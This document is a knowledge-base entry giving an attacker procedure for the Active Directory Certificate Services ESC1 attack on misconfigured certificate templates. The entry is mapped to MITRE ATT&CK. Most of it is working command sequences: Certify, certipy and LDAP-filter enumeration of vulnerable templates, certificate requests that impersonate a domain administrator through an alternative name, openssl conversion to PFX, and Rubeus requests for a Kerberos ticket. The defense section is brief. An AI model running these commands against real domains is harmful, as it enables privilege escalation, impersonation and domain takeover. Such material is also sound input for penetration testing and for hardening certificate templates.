---
id: 2f99ad63-719b-45a2-8320-0d75292bfb7e
name: Misconfigured Certificate Templates
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.750993+00:00'
updated_at: '2023-04-10T20:25:45.439371+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Access Token Manipulation|T1134 - Access Token Manipulation]]'
- '[[Bypass User Account Control|T1088 - Bypass User Account Control]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Certificate Services]]'
- '[[ESC1 - Misconfigured Certificate Templates]]'
commands:
- '[[Certify.exe find /vulnerable]]'
- '[[Certify.exe find /vulnerable /currentuser]]'
- '[[certipy find -bloodhound]]'
- '[[Export Certificate to PFX format]]'
- '[[Get-ADObject LDAPFilter]]'
- '[[Request certificates for the machine account]]'
- '[[Request certificate using certi.py]]'
- '[[Request certificate using certipy]]'
- '[[Rubeus.exe asktgt]]'
---

# Misconfigured Certificate Templates

## Summary

Misconfigured certificate templates can allow attackers to generate certificates with excessive permissions, such as Domain Administrator. Attackers can use these certificates to perform actions that would otherwise be restricted, such as accessing sensitive information or creating new accounts. Th

## Description

# Description

Misconfigured certificate templates can allow attackers to generate certificates with excessive permissions, such as Domain Administrator. Attackers can use these certificates to perform actions that would otherwise be restricted, such as accessing sensitive information or creating new accounts. This attack is often used in combination with other AD attacks to escalate privileges and move laterally within the network.

To exploit this vulnerability, an attacker would need to identify a vulnerable certificate template, request a certificate using that template, and then use the certificate to perform actions on the network. This procedure outlines the steps an attacker would take to exploit this vulnerability, as well as the business value of such an attack.

The business value of exploiting this vulnerability is that an attacker can gain excessive permissions and access sensitive information, which can lead to data theft, data destruction, and other malicious activities.

 

## Requirements

1. Valid domain credentials

1. Access to Active Directory Certificate Services

1. Access to OpenSSL

1. Access to Rubeus

 

## Defense

1. Regularly review and update certificate templates to ensure they are not misconfigured

1. Limit access to Active Directory Certificate Services to only authorized personnel

1. Implement network segmentation to limit lateral movement within the network

 

## Objectives

1. Identify vulnerable certificate templates

1. Request a certificate using a vulnerable template

1. Use the certificate to escalate privileges and move laterally within the network

 

# Instructions

1. To check for vulnerable certificate templates, you can use Certify.exe or certipy. The first command checks for vulnerable templates on the local machine, while the second command checks for vulnerable templates on a remote domain. The LDAP filter in the second command searches for certificate templates that have certain properties, such as not being enrolled, not having a signature, and having certain extended key usages.

 



**Code**: [[Certify.exe find /vulnerable
Certify.exe find /vul]]



> The certificate templates used in an Active Directory environment can be vulnerable to certain attacks if they are not configured correctly. Attackers can abuse these vulnerabilities to issue unauthorized certificates, impersonate users, or gain access to sensitive information. To prevent such attacks, it is important to regularly check for vulnerable certificate templates and remove them or update their configurations.



**Command** ([[Certify.exe find /vulnerable]]):

```bash
Certify.exe find /vulnerable
```





**Command** ([[Certify.exe find /vulnerable /currentuser]]):

```bash
Certify.exe find /vulnerable /currentuser
```





**Command** ([[Get-ADObject LDAPFilter]]):

```powershell
PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'
```





**Command** ([[certipy find -bloodhound]]):

```bash
certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound
```



2. To request a certificate using Certify, run the following command in an elevated command prompt:

Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin

To request a certificate using Certi, run the following command:

certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN

To request a certificate using Certipy, run the following command:

certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'

 



**Code**: [[# request certificates for the machine account by ]]



> This command is used to request a certificate from a Certificate Authority (CA) using Certify, Certi, or Certipy. The command can be used to add an alternative name to the certificate to impersonate another user. The `request` option is used to request a certificate. The `/ca` option specifies the CA to use for the request. The `/template` option specifies the certificate template to use. The `/altname` option specifies the alternative name to add to the certificate. The `req` option is used to request a certificate using Certi or Certipy. The first argument is the subject name of the certificate. The second argument is the name of the CA to use. The `-k` option is used to generate a new private key. The `-n` option is used to generate a new certificate. The `--alt-name` option is used to add an alternative name to the certificate. The `--template` option is used to specify the certificate template to use. The `-ca` option is used to specify the CA to use for the request. The `-alt` option is used to add an alternative name to the certificate.



**Command** ([[Request certificates for the machine account]]):

```bash
Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin
```





**Command** ([[Request certificate using certipy]]):

```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
```





**Command** ([[Request certificate using certi.py]]):

```bash
certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
```



3. To convert a certificate to PFX using OpenSSL, run the following command:

 



**Code**: [[openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft]]



> This command uses OpenSSL to convert the certificate file 'cert.pem' to a PFX file format. The '-keyex' flag is used to specify that the private key should be included in the output file. The '-CSP' flag specifies the Cryptographic Service Provider to use. In this case, it is set to 'Microsoft Enhanced Cryptographic Provider v1.0'. The '-export' flag specifies that the output file should be in PFX format. The output file is specified using the '-out' flag and the file name 'cert.pfx'. The command does not prompt for a password, so the resulting PFX file will not be password protected.



**Command** ([[Export Certificate to PFX format]]):

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```



4. To use this command, you will need to have Rubeus.exe installed on your system. Move the cert.pfx file to the target machine's filesystem before running this command.

 



**Code**: [[Rubeus.exe asktgt /user:domadmin /certificate:C:\T]]



> This command is used to request a TGT (Ticket Granting Ticket) for a specific user using Rubeus. The /user argument specifies the username for which the TGT is being requested. The /certificate argument specifies the path to the certificate file that will be used for the request. This command is useful for performing Kerberos attacks on a target network.



**Command** ([[Rubeus.exe asktgt]]):

```bash
Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Access Token Manipulation|T1134 - Access Token Manipulation]]
- [[Bypass User Account Control|T1088 - Bypass User Account Control]]

## Commands Used

- [[Certify.exe find /vulnerable]]
- [[Certify.exe find /vulnerable /currentuser]]
- [[certipy find -bloodhound]]
- [[Export Certificate to PFX format]]
- [[Get-ADObject LDAPFilter]]
- [[Request certificates for the machine account]]
- [[Request certificate using certi.py]]
- [[Request certificate using certipy]]
- [[Rubeus.exe asktgt]]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Certificate Services]]
- [[ESC1 - Misconfigured Certificate Templates]]


